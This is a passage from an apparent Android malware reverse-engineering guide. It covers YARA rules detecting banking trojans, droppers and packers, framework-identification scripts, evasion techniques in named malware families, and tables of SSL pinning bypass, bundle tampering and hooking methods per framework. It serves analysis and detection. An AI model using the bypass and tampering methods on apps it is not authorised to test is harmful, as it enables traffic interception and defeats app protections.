methods returning <code>String</code>. These are decryption stubs. Gigabud Core logic in native <code>libstrategy.so</code> with Virbox packing Analyze the Java layer for accessibility service registration, then trace native calls via Frida. Antidot Custom string encryption + gibberish class names Identify the decryption method pattern and write a jadx script or Frida hook to bulk-decrypt all strings. Triada firmware variants Malware code embedded in system framework Compare system partition against known-good firmware images. Diff framework JARs and system apps."},{"location":"reversing/static-analysis/#flutterdart-analysis","title":"Flutter/Dart Analysis","text":"<p>FluHorse and other Flutter-based malware require a different toolchain since business logic compiles to native code via Dart's AOT compiler rather than Dalvik bytecode:</p> Tool Purpose Blutter Dart AOT snapshot analyzer. Extracts class/method names and rebuilds Dart source from <code>libapp.so</code>. reFlutter Framework re-patching tool. Patches <code>libflutter.so</code> to enable SSL traffic interception and snapshot analysis. Doldrums Dart AOT snapshot parser for older Dart versions. <p>The workflow: extract <code>libapp.so</code> from the APK, determine the Dart SDK version from <code>libflutter.so</code>, then use Blutter to parse the snapshot and recover function signatures and string references. Fortinet published a detailed static reversing methodology at Virus Bulletin 2024.</p> <p>See Development Frameworks for the full Flutter analysis methodology, other cross-platform framework identification, and framework-specific hooking strategies.</p>"},{"location":"reversing/static-analysis/#yara-rules-for-android-malware","title":"YARA Rules for Android Malware","text":"<p>YARA rules enable automated detection and classification of Android malware during static triage. Write rules that match structural patterns, string constants, and byte sequences unique to malware families or behaviors.</p>"},{"location":"reversing/static-analysis/#writing-effective-android-yara-rules","title":"Writing Effective Android YARA Rules","text":"<p>Android-specific considerations:</p> Consideration Details APK is a ZIP archive YARA scans the raw ZIP bytes -- strings inside compressed entries may not match. Scan the unpacked APK directory or individual DEX files instead. DEX file format Target <code>classes.dex</code> directly. DEX header magic is <code>dex\\n035\\0</code> (or <code>036</code>, <code>037</code>, <code>038</code> for newer versions). Multi-DEX Large apps split code across <code>classes.dex</code>, <code>classes2.dex</code>, etc. Scan all DEX files. Packed samples YARA sees the packer stub, not the payload. Rules for packed malware should target packer signatures, not payload behavior. For packer identification patterns, see Packers."},{"location":"reversing/static-analysis/#rule-examples","title":"Rule Examples","text":"Banking trojan detection rule <pre><code>rule Android_BankingTrojan_Generic\n{\n    meta:\n        description = \"Detects common Android banking trojan patterns\"\n        author = \"AWAKE\"\n        date = \"2025-01-01\"\n        target = \"Android DEX\"\n\n    strings:\n        $dex_magic = \"dex\\n03\"\n\n        $accessibility = \"android/accessibilityservice/AccessibilityService\"\n        $overlay = \"SYSTEM_ALERT_WINDOW\"\n        $sms_read = \"android.permission.READ_SMS\"\n        $sms_receive = \"android.permission.RECEIVE_SMS\"\n\n        $keylog = \"AccessibilityEvent\" ascii\n        $inject = \"webView\" ascii nocase\n        $screen_capture = \"MediaProjection\" ascii\n\n        $target_chase = \"com.chase.sig.android\" ascii\n        $target_boa = \"com.infonow.bofa\" ascii\n        $target_wells = \"com.wf.wellsfargomobile\" ascii\n        $target_paypal = \"com.paypal.android.p2pmobile\" ascii\n        $target_coinbase = \"com.coinbase.android\" ascii\n\n    condition:\n        $dex_magic at 0 and\n        $accessibility and\n        ($overlay or ($sms_read and $sms_receive)) and\n        any of ($keylog, $inject, $screen_capture) and\n        2 of ($target_*)\n}\n</code></pre> Dropper/loader detection rule <pre><code>rule Android_Dropper_DynamicLoading\n{\n    meta:\n        description = \"Detects Android droppers using dynamic DEX loading\"\n        author = \"AWAKE\"\n        date = \"2025-01-01\"\n\n    strings:\n        $dex_magic = \"dex\\n03\"\n\n        $dexloader1 = \"DexClassLoader\" ascii\n        $dexloader2 = \"InMemoryDexClassLoader\" ascii\n        $dexloader3 = \"PathClassLoader\" ascii\n\n        $crypto1 = \"AES\" ascii\n        $crypto2 = \"SecretKeySpec\" ascii\n        $crypto3 = \"Cipher\" ascii\n\n        $reflect1 = \"java/lang/reflect/Method\" ascii\n        $reflect2 = \"getDeclaredMethod\" ascii\n        $reflect3 = \"setAccessible\" ascii\n\n        $download1 = \"URLConnection\" ascii\n        $download2 = \"HttpURLConnection\" ascii\n        $download3 = \"OkHttpClient\" ascii\n\n    condition:\n        $dex_magic at 0 and\n        any of ($dexloader*) and\n        2 of ($crypto*) and\n        any of ($reflect*) and\n        any of ($download*)\n}\n</code></pre> Packer identification rules <pre><code>rule Android_Packer_Virbox\n{\n    meta:\n        description = \"Identifies Virbox-packed Android samples\"\n        author = \"AWAKE\"\n\n    strings:\n        $virbox1 = \"libvdog.so\" ascii\n        $virbox2 = \"libvirbox\" ascii\n        $virbox3 = \"senseShield\" ascii nocase\n        $virbox4 = \"vboxjni\" ascii\n\n    condition:\n        any of them\n}\n\nrule Android_Packer_TencentLegu\n{\n    meta:\n        description = \"Identifies Tencent Legu-packed Android samples\"\n        author = \"AWAKE\"\n\n    strings:\n        $legu1 = \"libshella.so\" ascii\n        $legu2 = \"libshellx.so\" ascii\n        $legu3 = \"com.tencent.StubShell\" ascii\n        $legu4 = \"tencent_stub\" ascii\n\n    condition:\n        any of them\n}\n\nrule Android_Packer_DexGuard\n{\n    meta:\n        description = \"Identifies DexGuard-protected Android samples\"\n        author = \"AWAKE\"\n\n    strings:\n        $dg1 = \"libdexguard.so\" ascii\n        $dg2 = \"dexguard\" ascii nocase\n        $dg3 = \"guardsquare\" ascii nocase\n\n    condition:\n        any of them\n}\n</code></pre>"},{"location":"reversing/static-analysis/#scanning-workflow","title":"Scanning Workflow","text":"<pre><code>mkdir -p /tmp/yara_scan\nunzip -o /path/to/base.apk -d /tmp/yara_scan/unpacked/\nyara -r /path/to/android_rules.yar /tmp/yara_scan/unpacked/\n</code></pre> <p>Scan DEX files directly for best results</p> <p>Scanning the raw APK (ZIP) misses strings inside compressed entries. Always unzip first and scan the extracted <code>classes*.dex</code> files and other assets individually.</p> <p>For bulk scanning across a sample corpus:</p> <pre><code>find /malware/samples/ -name \"classes*.dex\" -exec yara /path/to/rules.yar {} \\;\n</code></pre>"},{"location":"reversing/static-analysis/#tools","title":"Tools","text":"Tool Purpose jadx DEX to Java decompiler, GUI and CLI apktool APK disassembly/reassembly, Smali output APKiD Packer and obfuscator identification APKLeaks Extract URLs, endpoints, secrets, and API keys from APKs Ghidra Native code reverse engineering (free, NSA) dex2jar DEX to JAR conversion for use with Java decompilers Bytecode Viewer Multi-decompiler view (Procyon, CFR, FernFlower, jadx) JADX-GUI jadx with search, navigation, and deobfuscation features YARA Pattern matching for malware classification and IoC detection"},{"location":"reversing/static-analysis/#emerging-evasion-techniques","title":"Emerging Evasion Techniques","text":"<p>Beyond traditional packing and obfuscation, recent malware families have introduced novel techniques that specifically break static analysis assumptions:</p>"},{"location":"reversing/static-analysis/#manifest-obfuscation","title":"Manifest Obfuscation","text":"<p>SoumniBot (2024) exploits differences between how analysis tools and the Android OS parse <code>AndroidManifest.xml</code>. Kaspersky documented three techniques:</p> Technique Effect Invalid compression method ZIP entry uses unknown compression value. Android defaults to uncompressed; jadx/apktool fail to parse. Invalid manifest size Declared size in ZIP header does not match actual size. Android ignores mismatch; tools crash or produce corrupt output. Excessively long namespace strings Hundreds of thousands of characters in XML namespace. Causes analysis tools to hang or run out of memory."},{"location":"reversing/static-analysis/#net-maui-framework","title":".NET MAUI Framework","text":"<p>McAfee documented Android malware built entirely in C# using the .NET MAUI cross-platform framework. Core logic resides in blob binary files rather than DEX, meaning standard DEX decompilers (jadx, apktool) find no meaningful code. Multi-layer encryption (XOR + AES) further protects the actual payload.</p>"},{"location":"reversing/static-analysis/#steganographic-payloads","title":"Steganographic Payloads","text":"<p>Necro (2024) hides second-stage payloads inside PNG image files using steganography. The loader downloads what appears to be a standard image, extracts hidden data from pixel values, and loads it as a DEX payload. Network inspection sees an image download, not a malware fetch.</p>"},{"location":"reversing/static-analysis/#zip-manipulation-and-jadx-blocking","title":"ZIP Manipulation and JADX Blocking","text":"<p>GodFather v3 (2025) combines multiple anti-decompilation layers: ZIP archive manipulation with invalid headers prevents standard archive tools from extracting the APK contents, deliberately malformed manifest entries crash parsers, and injected <code>$JADXBLOCK</code> fields in class files cause the jadx decompiler to skip those classes entirely. This layered approach targets the specific analysis toolchain most researchers rely on.</p>"},{"location":"reversing/static-analysis/#ollvm-obfuscated-native-libraries","title":"OLLVM-Obfuscated Native Libraries","text":"<p>Mandrake (2024) moved core malicious functionality from DEX into native libraries obfuscated with OLLVM (Obfuscator-LLVM), applying control flow flattening, string encryption, and bogus control flow. Standard native code analysis tools like Ghidra require significant manual effort to deobfuscate.</p>"},{"location":"reversing/static-analysis/#limitations","title":"Limitations","text":"<p>Know when to stop</p> <p>Recognize when static analysis is hitting a wall. Spending hours fighting a packer or obfuscator statically is almost always less efficient than switching to dynamic analysis and dumping the decrypted code at runtime.</p> <p>Static analysis fails when:</p> <ul> <li>The app is packed (encrypted DEX, loaded at runtime) -- see Packers for identification and unpacking</li> <li>Heavy obfuscation (ProGuard, R8, DexGuard, Allatori) makes code unreadable</li> <li>Native code handles critical logic</li> <li>Code is downloaded from C2 after installation</li> <li>Reflection is used to hide API calls</li> <li>Manifest is deliberately malformed to crash analysis tools (SoumniBot)</li> <li>Non-DEX frameworks (.NET MAUI, Flutter, Xamarin) bypass traditional decompilers -- see Development Frameworks for framework-specific toolchains</li> <li>Payloads hidden in images via steganography (Necro)</li> <li>ZIP manipulation and <code>$JADXBLOCK</code> fields disable jadx decompilation (GodFather v3)</li> <li>Commercial packers (Virbox) virtualize DEX into proprietary VM instructions (Klopatra)</li> </ul> <p>Static analysis is a starting point, not the destination</p> <p>Even when static analysis is blocked by packing or obfuscation, it still provides value. The manifest, resource files, native library names, and APKiD results all inform your dynamic analysis strategy. Spend 15-20 minutes on static triage before switching to runtime approaches -- it saves time by telling you exactly what to hook and where to look.</p> <p>In these cases, move to Dynamic Analysis and Hooking.</p>"},{"location":"reversing/frameworks/","title":"Development Frameworks","text":"<p>Cross-platform frameworks change the Android threat model. Each framework introduces its own runtime, packaging format, and inter-layer bridge that creates attack surfaces absent in native Android apps. Identifying which framework built an app determines the entire reverse engineering approach, the toolchain, and the attack surface. An app built with Flutter has zero useful DEX code. A Cordova app has all logic in plaintext JavaScript. A React Native app with a JavaScript bridge creates an interception point between the UI layer and native APIs.</p>"},{"location":"reversing/frameworks/#framework-categories","title":"Framework Categories","text":"Category Frameworks Code Location Primary Attack Surface Web-based hybrid Cordova, Capacitor, PWA/TWA, RPG Maker, GDevelop JavaScript in <code>assets/www/</code> Plaintext source, WebView bridge, XSS-to-native escalation JS bridge React Native, NativeScript, Titanium, uni-app JavaScript bundle in assets, native bridge layer Bridge interception, bundle tampering, Hermes bytecode Compiled native Flutter, Qt, Delphi, Unreal Engine Compiled binary in <code>.so</code> libraries Stripped symbols, proprietary runtimes, no DEX-level visibility .NET/Mono Xamarin, Compose Multiplatform, Unity (Mono) IL assemblies (<code>.dll</code>) or DEX .NET decompilation, assembly tampering, Mono runtime hooks IL2CPP Unity (IL2CPP) Compiled native + metadata <code>global-metadata.dat</code> extraction, Il2CppDumper symbol recovery Lua/Python VM Corona, Cocos2d-x, Kivy, Defold, Ren'Py Bytecode in assets, interpreted at runtime Bytecode decompilation, asset extraction, runtime hooking No-code AppInventor, B4A Standard DEX (generated Java) Fully decompilable, predictable code patterns Game engines Godot, GameMaker, libGDX Engine-specific archive formats <code>.pck</code> extraction, proprietary bytecode, engine-level hooks"},{"location":"reversing/frameworks/#framework-identification","title":"Framework Identification","text":"<p>The fastest way to identify a framework is to unzip the APK and check for indicator files and native libraries.</p> Framework File Indicators Native Libraries Package/Class Markers React Native <code>assets/index.android.bundle</code> <code>libjsc.so</code> or <code>libhermes.so</code> <code>com.facebook.react.*</code> Flutter <code>assets/flutter_assets/kernel_blob.bin</code> (debug) <code>libflutter.so</code>, <code>libapp.so</code> <code>io.flutter.*</code> (thin bootstrap) Xamarin / .NET MAUI <code>assemblies/*.dll</code> in APK root or <code>assets/</code> <code>libmonosgen-2.0.so</code>, <code>libxamarin-app.so</code> <code>mono.MonoRuntimeProvider</code> Cordova / Ionic <code>assets/www/index.html</code>, <code>assets/www/cordova.js</code> None framework-specific <code>org.apache.cordova.*</code> Capacitor <code>assets/public/index.html</code> None framework-specific <code>com.getcapacitor.*</code> Unity (Mono) <code>assets/bin/Data/Managed/*.dll</code> <code>libmono.so</code>, <code>libunity.so</code> <code>com.unity3d.player.UnityPlayer</code> Unity (IL2CPP) <code>global-metadata.dat</code> in Metadata/ <code>libil2cpp.so</code>, <code>libunity.so</code> <code>com.unity3d.player.UnityPlayer</code> Godot <code>assets/*.pck</code> <code>libgodot_android.so</code> <code>org.godotengine.*</code> Unreal Engine <code>assets/*.pak</code>, <code>assets/*.utoc</code> <code>libUE4.so</code> or <code>libUnreal.so</code> <code>com.epicgames.unreal.GameActivity</code> NativeScript <code>assets/app/bundle.js</code> <code>libNativeScript.so</code> <code>org.nativescript.*</code> Kotlin Multiplatform No unique file indicators None framework-specific Standard Kotlin classes in DEX Qt for Android <code>assets/*.rcc</code> <code>libQt5Core_*.so</code>, <code>libQt6Core_*.so</code> <code>org.qtproject.qt5.*</code> Kivy (Python) <code>assets/private.tar</code>, <code>assets/public.tar</code> <code>libpython*.so</code>, <code>libSDL2.so</code> <code>org.kivy.*</code> Delphi / RAD Studio None distinctive <code>libFMXNativeActivity.so</code> <code>com.embarcadero.*</code> B4A (Basic4Android) <code>assets/*.bal</code> None framework-specific <code>anywheresoftware.b4a.*</code> GameMaker <code>assets/game.droid</code> <code>libyoyo.so</code> <code>com.yoyogames.*</code> Corona / Solar2D <code>assets/resource.car</code> <code>libcorona.so</code>, <code>liblua.so</code> <code>com.ansca.corona.*</code> Cocos2d-x <code>assets/src/*.lua</code> or <code>assets/script/</code> <code>libcocos2dlua.so</code> or <code>libcocos2djs.so</code> <code>org.cocos2dx.*</code> Titanium <code>assets/Resources/</code> <code>libkroll-v8.so</code>, <code>libtitanium.so</code> <code>org.appcelerator.titanium.*</code> Compose Multiplatform No unique file indicators None framework-specific <code>androidx.compose.*</code> in DEX AppInventor / Kodular <code>assets/youngandroidproject/</code> None framework-specific <code>com.google.appinventor.*</code>, <code>appinventor.ai_*</code> libGDX <code>assets/*.atlas</code>, <code>assets/*.tmx</code> <code>libgdx.so</code> <code>com.badlogic.gdx.*</code> Defold <code>assets/game.dmanifest</code>, <code>assets/game.arcd</code> <code>libdmengine.so</code> <code>com.defold.*</code> Ren'Py <code>assets/renpy/</code>, <code>assets/game/*.rpyc</code> <code>libpython*.so</code>, <code>librenpy.so</code> <code>org.renpy.*</code> RPG Maker <code>assets/www/js/rpg_*.js</code> None framework-specific RPG Maker MV/MZ uses Cordova-like webview uni-app <code>assets/apps/</code>, <code>assets/data/dcloud_*.json</code> None framework-specific <code>io.dcloud.*</code> GDevelop <code>assets/www/gd.js</code>, <code>assets/www/pixi*.js</code> None framework-specific Cordova-wrapped HTML5 game Felgo <code>assets/*.rcc</code> <code>libQt5Core*.so</code>, <code>libFelgo*.so</code> <code>net.vplay.*</code> or <code>com.felgo.*</code> PWA / TWA Minimal APK, <code>assetlinks.json</code> reference None <code>LauncherActivity</code> + Chrome Custom Tabs"},{"location":"reversing/frameworks/#framework-detection-script","title":"Framework Detection Script","text":"<p>Shell-based detection by examining APK contents:</p> <pre><code>unzip -l target.apk &gt; /tmp/apk_contents.txt\n\nif grep -q \"assets/index.android.bundle\" /tmp/apk_contents.txt; then\n    if grep -q \"libhermes.so\" /tmp/apk_contents.txt; then\n        echo \"React Native (Hermes engine)\"\n    else\n        echo \"React Native (JavaScriptCore)\"\n    fi\nelif grep -q \"libflutter.so\" /tmp/apk_contents.txt; then\n    echo \"Flutter\"\nelif grep -q \"assemblies/\" /tmp/apk_contents.txt; then\n    echo \"Xamarin / .NET MAUI\"\nelif grep -q \"assets/www/cordova.js\" /tmp/apk_contents.txt; then\n    echo \"Cordova / Ionic\"\nelif grep -q \"assets/public/index.html\" /tmp/apk_contents.txt; then\n    echo \"Capacitor\"\nelif grep -q \"libil2cpp.so\" /tmp/apk_contents.txt; then\n    echo \"Unity (IL2CPP)\"\nelif grep -q \"libmono.so\" /tmp/apk_contents.txt &amp;&amp; grep -q \"libunity.so\" /tmp/apk_contents.txt; then\n    echo \"Unity (Mono)\"\nelif grep -q \"libgodot_android.so\" /tmp/apk_contents.txt; then\n    echo \"Godot\"\nelif grep -q \"libUE4.so\" /tmp/apk_contents.txt || grep -q \"libUnreal.so\" /tmp/apk_contents.txt; then\n    echo \"Unreal Engine\"\nelif grep -q \"libNativeScript.so\" /tmp/apk_contents.txt; then\n    echo \"NativeScript\"\nelif grep -q \"libQt5Core\" /tmp/apk_contents.txt || grep -q \"libQt6Core\" /tmp/apk_contents.txt; then\n    echo \"Qt for Android\"\nelif grep -q \"libpython\" /tmp/apk_contents.txt &amp;&amp; grep -q \"libSDL2.so\" /tmp/apk_contents.txt; then\n    echo \"Kivy (Python)\"\nelif grep -q \"libFMXNativeActivity.so\" /tmp/apk_contents.txt; then\n    echo \"Delphi / RAD Studio\"\nelif grep -q \"libyoyo.so\" /tmp/apk_contents.txt; then\n    echo \"GameMaker\"\nelif grep -q \"libcorona.so\" /tmp/apk_contents.txt; then\n    echo \"Corona / Solar2D\"\nelif grep -q \"libcocos2d\" /tmp/apk_contents.txt; then\n    echo \"Cocos2d-x\"\nelif grep -q \"libtitanium.so\" /tmp/apk_contents.txt || grep -q \"libkroll-v8.so\" /tmp/apk_contents.txt; then\n    echo \"Titanium (Appcelerator)\"\nelif grep -q \"libgdx.so\" /tmp/apk_contents.txt; then\n    echo \"libGDX\"\nelif grep -q \"libdmengine.so\" /tmp/apk_contents.txt; then\n    echo \"Defold\"\nelif grep -q \"assets/renpy/\" /tmp/apk_contents.txt; then\n    echo \"Ren'Py\"\nelif grep -q \"assets/www/js/rpg_core.js\" /tmp/apk_contents.txt; then\n    echo \"RPG Maker MV/MZ\"\nelif grep -q \"io.dcloud\" /tmp/apk_contents.txt || grep -q \"assets/data/dcloud_\" /tmp/apk_contents.txt; then\n    echo \"uni-app\"\nelif grep -q \"assets/www/gd.js\" /tmp/apk_contents.txt; then\n    echo \"GDevelop\"\nelif grep -q \"youngandroidproject\" /tmp/apk_contents.txt; then\n    echo \"AppInventor / Kodular\"\nelif grep -q \"anywheresoftware.b4a\" /tmp/apk_contents.txt; then\n    echo \"B4A (Basic4Android)\"\nelse\n    echo \"Native Android (Java/Kotlin)\"\nfi\n</code></pre> <p>Frida-based runtime detection:</p> <pre><code>Java.perform(function() {\n    var detected = false;\n\n    var checks = [\n        [\"com.facebook.react.ReactActivity\", \"React Native\"],\n        [\"io.flutter.embedding.engine.FlutterEngine\", \"Flutter\"],\n        [\"mono.MonoRuntimeProvider\", \"Xamarin\"],\n        [\"org.apache.cordova.CordovaActivity\", \"Cordova\"],\n        [\"com.getcapacitor.BridgeActivity\", \"Capacitor\"],\n        [\"com.unity3d.player.UnityPlayer\", \"Unity\"],\n        [\"org.godotengine.godot.Godot\", \"Godot\"],\n        [\"com.epicgames.unreal.GameActivity\", \"Unreal Engine\"],\n        [\"org.nativescript.NativeScriptActivity\", \"NativeScript\"],\n        [\"org.qtproject.qt5.android.QtActivity\", \"Qt\"],\n        [\"org.kivy.android.PythonActivity\", \"Kivy\"],\n        [\"com.embarcadero.firemonkey.FMXNativeActivity\", \"Delphi\"],\n        [\"anywheresoftware.b4a.BA\", \"B4A\"],\n        [\"org.appcelerator.titanium.TiApplication\", \"Titanium\"],\n        [\"com.badlogic.gdx.backends.android.AndroidApplication\", \"libGDX\"],\n        [\"org.renpy.android.PythonSDLActivity\", \"Ren'Py\"],\n        [\"io.dcloud.PandoraEntry\", \"uni-app\"],\n        [\"com.google.appinventor.components.runtime.Form\", \"AppInventor\"],\n    ];\n\n    checks.forEach(function(pair) {\n        try {\n            Java.use(pair[0]);\n            send(\"Framework: \" + pair[1]);\n            detected = true;\n        } catch(e) {}\n    });\n\n    if (!detected) {\n        send(\"Framework: Native Android\");\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/#attack-surfaces-by-framework-type","title":"Attack Surfaces by Framework Type","text":""},{"location":"reversing/frameworks/#web-based-hybrid-cordova-capacitor-pwa","title":"Web-Based Hybrid (Cordova, Capacitor, PWA)","text":"<p>Hybrid apps wrap a WebView around web content. The entire application logic is JavaScript in <code>assets/www/</code>, readable without decompilation.</p> Attack Surface Risk Exploitation Plaintext source code All business logic, API keys, auth tokens visible in cleartext Direct file extraction from APK JavaScript bridge Native plugin calls (<code>cordova.exec()</code>) expose device APIs to JS context Hook or patch bridge calls to intercept parameters WebView vulnerabilities <code>setJavaScriptEnabled(true)</code>, <code>setAllowFileAccess(true)</code> XSS-to-file-read, JavaScript interface injection Insecure <code>@JavascriptInterface</code> Exported methods callable from any JavaScript context within the WebView Inject JS to call exposed native methods No code signing for JS JavaScript can be modified without breaking APK signature Repackage with modified <code>assets/www/</code> content Client-side validation Auth checks, premium feature gates implemented in JS Patch JavaScript to bypass client-side logic <p>SpyLoan and predatory lending apps frequently use Cordova because web developers can build functional Android apps without mobile-specific skills. The readable JavaScript makes these apps trivial to analyze.</p>"},{"location":"reversing/frameworks/#javascript-bridge-react-native-nativescript","title":"JavaScript Bridge (React Native, NativeScript)","text":"<p>Bridge-based frameworks run JavaScript in a dedicated engine (JavaScriptCore, Hermes, V8) and communicate with native Android APIs through a serialized bridge.</p> Attack Surface Risk Exploitation Bridge interception All native API calls pass through a serializable bridge Frida hooks on <code>nativeCallSyncHook</code> or <code>com.facebook.react.bridge.*</code> Bundle tampering JS bundle in <code>assets/</code> can be extracted, modified, repackaged Modify <code>index.android.bundle</code>, disable auth checks or inject logging Hermes bytecode Hermes pre-compiles JS to custom bytecode, harder to read hermes-dec decompiles to readable JS JS-level secrets API keys, endpoint URLs, feature flags stored in JS bundle String extraction from bundle, even Hermes bytecode CodePush / OTA updates React Native apps can download JS updates at runtime MITM the update channel to inject malicious code Deep linking through JS router Navigation handled in JS, deep links parsed client-side Craft deep links that navigate to unintended screens or pass malicious parameters"},{"location":"reversing/frameworks/#compiled-native-flutter-qt-delphi-unreal","title":"Compiled Native (Flutter, Qt, Delphi, Unreal)","text":"<p>These frameworks compile application code to native ARM instructions. The DEX layer is a thin bootstrap with no business logic.</p> Attack Surface Risk Exploitation No DEX-level visibility jadx shows only framework bootstrap code Must use framework-specific tools (blutter for Flutter, Ghidra for Qt/Delphi) Stripped symbols Release builds strip function names from <code>.so</code> blutter recovers Dart symbols from AOT snapshots; Qt/Delphi require manual RE BoringSSL pinning (Flutter) SSL pinning implemented in native <code>libflutter.so</code> Patch <code>ssl_crypto_x509_session_verify_cert_chain</code>, use reFlutter Dart snapshot format Flutter's AOT snapshot is a proprietary format blutter + Ghidra for code analysis, Frida for runtime hooks at recovered offsets Platform channel bridge Flutter communicates with native code via MethodChannel Hook <code>io.flutter.plugin.common.MethodChannel</code> to intercept platform calls <p>FluHorse uses Flutter because Dart AOT compilation into <code>libapp.so</code> defeats the standard jadx analysis pipeline. Analysts must use blutter to recover Dart symbols before meaningful analysis is possible.</p>"},{"location":"reversing/frameworks/#net-mono-xamarin-unity-mono","title":".NET / Mono (Xamarin, Unity Mono)","text":"<p>.NET-based frameworks package IL assemblies (<code>.dll</code> files) that decompile to near-source-quality C# with tools like dnSpy or ILSpy.</p> Attack Surface Risk Exploitation High-fidelity decompilation IL assemblies decompile to readable C# with types, names, and control flow intact dnSpy/ILSpy produce near-original source code Assembly tampering <code>.dll</code> files can be modified and repackaged Patch C# IL directly with dnSpy, repackage APK Mono runtime hooks Mono exposes <code>mono_jit_runtime_invoke</code> for hooking any managed method Frida hooks on Mono runtime internals .NET MAUI blob evasion .NET MAUI stores assemblies in blob files that evade DEX-based scanners McAfee documented malware using C# in blob files to bypass DEX scanning"},{"location":"reversing/frameworks/#il2cpp-unity","title":"IL2CPP (Unity)","text":"<p>Unity's IL2CPP backend compiles C# to native C++ then to ARM. The <code>.dll</code> assemblies are gone, but <code>global-metadata.dat</code> preserves type information.</p> Attack Surface Risk Exploitation Metadata extraction <code>global-metadata.dat</code> contains all class names, method names, and string literals Il2CppDumper extracts full type hierarchy and generates C# stubs Symbol-guided RE Il2CppDumper output maps native addresses to C# method names Load Il2CppDumper output into Ghidra/IDA for named native analysis SDK embedding Unity games embed third-party SDKs that may be malicious Goldoson was a malicious SDK in 60+ legitimate Unity games (100M+ installs) Asset bundle tampering Unity asset bundles can be extracted, modified, and repacked AssetStudio for extraction, custom tools for repacking"},{"location":"reversing/frameworks/#supply-chain-risks","title":"Supply Chain Risks","text":"<p>Cross-platform frameworks increase supply chain attack surface through their dependency chains.</p> Risk Framework Example Malicious SDK in legitimate apps Unity Goldoson SDK embedded in 60+ apps, collected device data and performed ad fraud Compromised npm packages React Native, Cordova, NativeScript Typosquatting and dependency confusion attacks against JavaScript package registries Malicious plugins Cordova, Capacitor Plugins bridge JS to native APIs; a malicious plugin gets full native access Pre-built binary dependencies Flutter, Unity, React Native Native <code>.so</code> libraries from third-party packages may contain backdoors OTA code injection React Native (CodePush), Cordova (Hot Code Push) Runtime code updates bypass Play Store review and app signing <p>OTA update mechanisms are particularly concerning. React Native's CodePush and similar systems allow downloading and executing new JavaScript at runtime, completely bypassing Google Play review. A compromised update server or MITM attack on the update channel can inject arbitrary code into deployed apps.</p>"},{"location":"reversing/frameworks/#ssl-pinning-bypass-by-framework","title":"SSL Pinning Bypass by Framework","text":"Framework Pinning Location Bypass Method Tool React Native JS layer or native TrustManager Patch bundle or Java-layer Frida hook Frida, bundle patching Flutter BoringSSL in <code>libflutter.so</code> Patch <code>ssl_crypto_x509_session_verify_cert_chain</code> reFlutter, Ghidra binary patch Xamarin Mono <code>ServicePointManager</code> or <code>MobileTlsProvider</code> Patch the .dll or Frida mono runtime hook dnSpy, Frida Cordova / Ionic Java plugin (OkHttp) or <code>WebViewClient</code> Standard Java-layer Frida hooks Frida, Objection Unity (Mono) C# <code>UnityWebRequest</code> or embedded OkHttp Patch <code>Assembly-CSharp.dll</code> or Java-layer hook dnSpy, Frida Unity (IL2CPP) Native compiled cert check Il2CppDumper to locate function, Frida native hook Il2CppDumper, Frida Godot mbedTLS compiled into engine Native hook on <code>mbedtls_ssl_handshake</code> Frida, Ghidra Unreal Engine OpenSSL or platform TrustManager Native hook or Java-layer bypass Frida NativeScript V8 bridge to Java TrustManager Java-layer Frida hooks Frida Qt <code>QSslSocket</code> in <code>libQt5Network.so</code> Native Frida hook on SSL verification Frida, Ghidra Kivy Python <code>ssl</code> module via <code>libpython</code> Patch Python ssl module or hook native OpenSSL Frida Delphi Indy TIdSSLIOHandlerSocketOpenSSL Native hook on OpenSSL verify callback Frida, Ghidra B4A Java OkHttp or HttpURLConnection Standard Java-layer hooks Frida, Objection Titanium V8-based JS with Java HTTP wrappers Java-layer Frida hooks Frida libGDX Java HttpURLConnection or OkHttp Standard Java-layer hooks Frida, Objection Ren'Py Python <code>urllib</code>/<code>requests</code> via <code>libpython</code> Patch Python ssl or hook native OpenSSL Frida uni-app WebView or Java HTTP client Java-layer hooks or WebView interception Frida AppInventor / Kodular Java HttpURLConnection Standard Java-layer hooks Frida, Objection Compose Multiplatform OkHttp or Ktor client Standard Java-layer hooks Frida, Objection Native Android OkHttp <code>CertificatePinner</code>, TrustManager, NSC Standard Java-layer Frida hooks Frida, Objection"},{"location":"reversing/frameworks/#hooking-strategy-by-framework","title":"Hooking Strategy by Framework","text":"Framework Frida Approach Hook Target Effectiveness React Native (JSC) Java bridge hooks + JS bundle patching <code>com.facebook.react.bridge.*</code>, native module calls Moderate React Native (Hermes) Native hooks on <code>libhermes.so</code> Hermes runtime functions, <code>nativeCallSyncHook</code> Limited Flutter Native hooks on <code>libapp.so</code> at blutter offsets Dart function addresses from blutter output Moderate Xamarin Mono runtime hooks or DLL patching <code>mono_jit_runtime_invoke</code>, .NET methods via Mono API High Cordova / Ionic WebView hooks + direct JS modification <code>WebView.loadUrl</code>, <code>evaluateJavascript</code>, JS bridge High Unity (Mono) Mono runtime hooks <code>Assembly-CSharp.dll</code> methods via Mono API High Unity (IL2CPP) Native hooks at Il2CppDumper offsets C++ compiled method addresses from metadata dump Moderate Godot Native hooks on <code>libgodot_android.so</code> GDScript VM functions, exported engine methods Limited Unreal Engine Native hooks on <code>libUE4.so</code> Blueprint bytecode interpreter, UObject methods Low NativeScript V8 bridge hooks + JS patching Java bridge layer, native API bindings Moderate Kotlin Multiplatform Standard Java hooks Regular Java/Kotlin methods in DEX High Qt Native hooks on Qt libraries <code>QNetworkAccessManager</code>, <code>QSslSocket</code> Low Kivy Python runtime hooks via <code>libpython</code> Python function objects, C extension calls Limited Delphi Native hooks on <code>libFMXNativeActivity.so</code> Object Pascal compiled methods Low B4A Standard Java hooks Generated Java classes in DEX High Titanium V8 bridge hooks + JS patching <code>org.appcelerator.titanium.*</code>, Kroll bridge Moderate libGDX Standard Java hooks <code>com.badlogic.gdx.*</code> game loop and scene classes High Compose Multiplatform Standard Java hooks Regular Kotlin/Compose methods in DEX High AppInventor / Kodular Standard Java hooks <code>com.google.appinventor.*</code> components High Ren'Py Python runtime hooks via <code>libpython</code> Python game script functions, Ren'Py engine Limited RPG Maker WebView hooks + JS modification JavaScript game engine in <code>assets/www/</code> High uni-app WebView hooks + bridge interception <code>io.dcloud.*</code> bridge, JavaScript engine Moderate Defold Native hooks on <code>libdmengine.so</code> Lua VM functions, engine exports Limited GDevelop WebView hooks + JS modification Pixi.js game engine in <code>assets/www/</code> High Felgo Native hooks on Qt + Felgo libraries QML engine, Felgo game/app components Low"},{"location":"reversing/frameworks/#reverse-engineering-difficulty-ranking","title":"Reverse Engineering Difficulty Ranking","text":"<p>From easiest to hardest:</p> Rank Framework Why 1 Cordova / Ionic / Capacitor All code is readable JavaScript in <code>assets/www/</code> 2 RPG Maker 